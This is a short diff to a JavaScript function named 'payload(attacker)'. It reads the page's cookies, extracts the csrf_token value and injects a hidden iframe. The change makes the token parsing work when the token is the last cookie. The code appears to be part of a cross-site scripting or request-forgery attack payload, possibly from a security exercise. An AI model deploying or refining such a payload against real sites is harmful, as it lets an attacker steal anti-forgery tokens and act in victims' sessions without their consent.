@@ -8,8 +8,8 @@ function payload(attacker) {
         window.history.pushState({page: 1}, "page 1", "./");
         var cookie = document.cookie.toString();
         var trimmed = cookie.substring(cookie.indexOf("csrf_token") + "csrf_token=".length);
-        var token = trimmed.substring(0, trimmed.indexOf(";"));
-         
+        var token = trimmed.indexOf(";") < 0 ? trimmed : trimmed.substring(0, trimmed.indexOf(";"));
+        
         $('<iframe name="displaynone", style="display: none"></iframe>').appendTo('html');
 
         if($("#log-out-btn").length) {
